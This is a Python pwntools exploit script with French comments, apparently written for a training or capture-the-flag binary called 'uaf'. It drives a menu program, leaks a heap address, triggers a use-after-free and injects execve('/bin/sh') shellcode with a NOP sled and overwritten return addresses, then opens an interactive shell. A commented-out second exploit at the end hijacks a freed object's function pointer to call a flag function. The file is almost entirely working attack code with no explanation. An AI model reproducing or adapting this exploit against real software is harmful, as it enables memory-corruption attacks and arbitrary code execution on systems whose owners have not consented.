import pwn
import struct
import pwnlib.util.packing
'''
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
'''

p = pwn.process("./uaf")
p.recv()

print("Creation de 2 interfaces...") 

# Create 1st
p.sendline("1")
p.recv()
#name
p.sendline("a")
p.recv()
#ip
p.sendline("a")
p.recv()
#turnon
p.sendline("1")
p.recv()
#save
p.sendline("1")
p.recv()

# Create 2nd
p.sendline("1")
p.recv()
#name
p.sendline("b")
p.recv()
#ip
p.sendline("b")
p.recv()
#turnon
p.sendline("1")
p.recv()
#save
p.sendline("2")
p.recv()

print("Seeking leaked @ now ! ")
p.sendline("5")
text = p.recv()

addr = text[26:38]
#print(addr)
import binascii
addr=binascii.unhexlify(addr.hex()).decode('utf8')
print(" Adresse turnOn de la struct: %s" % addr) 
buffer = int(addr,16)- 58
print("buffer @ = 0x%x" % buffer)
#print("buffer @ = %s" % hex(buffer))
s= pwnlib.util.packing.p64(buffer, endian='little')
#pwnlib.util.packing.u64()
#s=buffer
print(s)
#print(binascii.unhexlify(binascii.hexlify(s)))
#print("buffer packed =" + str(s))

print("Destruction des 2 interfaces crees !") 
#destroy
p.sendline("4")
p.recv()
#select
p.sendline("0")
p.recv()
#interface a
p.sendline("1")
p.recv()
#destroy
p.sendline("4")
p.recv()

print("creation de la 3eme interface...")
# Create 3rd
p.sendline("1")
p.recv()
#name
p.sendline("c")
p.recv()
#20 shellcode+ 12 NOP +4@ (8*4)=64
#Shell:`perl -e 'print "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\x90" x 12 . "\xC8\xB2\xAE\xEB\xFF\x7F" x 4 '`
shellcode="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"\x90" * 12 +"\xee\xa6c\xde\xff\x7f"*4
print("Shellcode: %s" % shellcode)
print("Insertion du shellcode dans le champs ip #strdump")
#ip
#p.send(shellcode)
#print("\xee\xa6c\xde\xff\x7f")
#print(s * 4)
p.sendline(shellcode)
p.recv()
#turnon
p.sendline("1")
p.recv()
#save
p.sendline("3")
p.recv()

print("trying...")
p.sendline("0")
p.recv()
p.sendline("2")
p.recv()
p.sendline("3")
print(p.recv())

p.interactive()














'''
# Free the dog house
p.sendline("7")
p.recv()

# Create the dog
p.sendline("1")
p.recv()
p.sendline("AAAAAAAAAAAA")
p.recv()

# Leak the bark() address
p.sendline("6")
text = p.recv()
print(text)

addr = text[12:16]
bark_func = struct.unpack("<L", addr)[0]
print("bark() = 0x%08x" % bark_func)
flag_func = bark_func + 0x66
print("bringBackTheFlag() = 0x%08x" % flag_func)

# Free the dog
p.sendline("4")
p.recv()

# Reallocate a house with a specific name:
# dog+offset(bark) = bringBackTheFlag
p.sendline("5")
p.recv()
msg = 'A'*12 + struct.pack("<L", flag_func)
p.sendline(msg)
p.recv()
p.sendline("housename")
p.recv()

# Ask the dog to bark to get the flag
p.sendline("2")
p.recv()
'''
#at the end: p.interactive()